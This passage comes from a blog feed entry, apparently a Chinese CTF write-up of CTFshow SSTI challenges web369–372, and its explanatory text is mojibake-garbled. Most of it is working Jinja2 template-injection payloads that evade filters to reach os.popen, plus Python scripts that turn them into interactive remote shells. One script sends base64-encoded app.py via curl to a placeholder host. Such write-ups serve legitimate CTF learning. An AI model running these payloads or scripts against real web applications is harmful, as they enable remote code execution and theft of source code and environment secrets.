punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#_</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c1<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>a<span class="token punctuation">,</span>t<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__init__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c2<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>a<span class="token punctuation">,</span>bals<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__globals__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c3<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__getitem__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c4<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>a<span class="token punctuation">,</span>tins<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c5<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>a<span class="token punctuation">,</span>al<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> sc<span class="token operator">=</span>a<span class="token operator">|</span>pprint<span class="token operator">|</span>pprint<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#'   pprint filter åœ¨å­—ç¬¦ä¸²ä¸Šä¼šåŠ ä¸Šå•å¼•å·</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#(</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> rb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#)</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point<span class="token operator">=</span><span class="token number">3.14</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#.</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> x<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>a<span class="token punctuation">,</span>ort<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>a<span class="token punctuation">,</span>s<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>a<span class="token punctuation">,</span>pen<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>en<span class="token operator">=</span>a<span class="token punctuation">,</span>v<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>rea<span class="token operator">=</span>a<span class="token punctuation">,</span>d<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>rb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment"># __import__('os').popen('env').read()</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">|</span>attr<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c5<span class="token punctuation">)</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#print(a.__init__.__globals__.__getitem__("__builtins__").__getitem__("eval")("__import__('os').popen('env').read()"))</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop </span></code></pre><ul><li>è¿™è¡Œä»£ç ä½¿ç”¨Jinja2çš„æ¨¡æ¿è¯­æ³•ï¼Œé€šè¿‡å­—å…¸å’Œjoinè¿‡æ»¤å™¨æ„é€ äº†ä¸€ä¸ªå­—ç¬¦ä¸² â€œpopâ€ã€‚<code>dict(p=a, op=a)</code> åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«é”®å€¼å¯¹ <code>&#123;&#39;p&#39;: a, &#39;op&#39;: a&#125;</code> çš„å­—å…¸ï¼Œç„¶å <code>|join</code> å°†è¿™äº›é”®è¿æ¥æˆå­—ç¬¦ä¸² â€œpopâ€ã€‚</li></ul><p>å…¶ä»–ç›¸ä¼¼åŸç†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://106261e2-bcd9-4731-a15e-35ac39f86511.challenge.ctf.show/?name="</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)(24)%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set c2=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set c3=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set c4=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web370-è¿‡æ»¤äº†æ•°å­—"><a href="#web370-è¿‡æ»¤äº†æ•°å­—" class="headerlink" title="web370(è¿‡æ»¤äº†æ•°å­—)"></a>web370(è¿‡æ»¤äº†æ•°å­—)</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://717d6b1c-8b55-4083-b8af-52d9b0fd1eab.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># print(payload)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web371-372-æ— å›æ˜¾"><a href="#web371-372-æ— å›æ˜¾" class="headerlink" title="web371-372(æ— å›æ˜¾)"></a>web371-372(æ— å›æ˜¾)</h4><p>371ä¸ç»™ printï¼Œcurl å¸¦å¤–</p><p>372è¿‡æ»¤countï¼Œä½†æ˜¯ä¸å½±å“</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://39ebd089-1562-497f-bff2-83664f8ae528.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% set b=eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>run<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('curl -F file=`base64 app.py -w 0` http://xxxxx/').read()"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-ssrf</title>
      <link href="/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/"/>
      <url>/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/</url>
      
